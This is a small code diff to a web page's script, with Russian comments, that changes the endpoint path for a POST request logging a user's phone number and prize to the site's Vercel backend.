@@ -244,7 +244,7 @@ continueBtn.onclick = async () => {
 
   // 1️⃣ Отправляем лог на сервер Vercel
   try {
-    await fetch("https://optimusosen.vercel.app/log", { 
+    await fetch("https://optimusosen.vercel.app/api/log", { 
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message: `Номер: ${phone}, Приз: ${prize}` })
@@ -308,4 +308,5 @@ continueBtn.onclick = async () => {
 </div> -->
 </body>
 </html>
+
 
